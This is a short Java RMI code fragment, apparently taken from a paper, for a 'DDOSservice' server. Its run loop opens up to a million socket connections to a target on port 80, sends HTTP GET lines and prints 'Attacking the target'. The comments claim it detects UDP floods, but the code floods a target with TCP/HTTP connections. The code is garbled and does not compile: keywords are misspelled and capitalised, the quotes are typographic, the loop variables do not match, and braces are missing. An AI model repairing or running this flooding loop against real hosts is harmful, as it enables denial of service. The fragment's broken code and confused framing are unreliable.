import java.rmi.*;
public interface DDOSservice extends Remote
{
//Interface of RMI service that will actually attack on a target
machine
public String attackdetection()
{
throw RemoteException;
}
}
Server program
Public class DDOSServer extends UniCastRemoteObject
implmenets Runnable DDOSservice
{
 Final String Target = “xyz”;
Static DDOSServiceServer_instance;
Public DDOSServiceServer() throws RemoteException
{
super();
}
Public void run()
{
//fix the Threshold value as 100000
/if it exceeds the Threshold identify the UDP flood exception
//Accepting the packets from the client
For(int UDP=0;UDP<=1000000;i++)
{
try{
 Socket net = new Socket(Target,80);
sendRawLine(“GET/HTTP/1.1”,net);
sendRawline(“Host:”+Target,net);
System.out.println(“Attacking the”+Target”+” with
connection”+UDP);
}catch(Exception e)
{
System.out.println(“UDP flood attack);
}
}
